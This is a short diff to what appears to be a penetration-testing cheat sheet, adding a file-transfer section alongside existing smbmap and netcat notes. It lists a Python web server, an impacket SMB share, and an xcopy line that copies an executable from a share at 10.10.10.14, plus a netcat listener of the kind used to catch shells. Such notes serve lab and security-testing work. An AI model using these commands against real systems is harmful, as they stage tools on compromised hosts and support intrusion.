@@ -58,6 +58,13 @@ Smbmap (shows a list of SMB Shares)
   -R (-R list contents of shares)
   --download (download file)
 
+File Transfer
+  Web Server
+    python -m SimpleHTTPServer <port / default 8000>
+  SMB Share
+    impacket-smbserver files `pwd`
+      - example: xcopy \\10.10.10.14\files\filename.exe
+
 NetCat
   Listener - nc -lvnp port
   
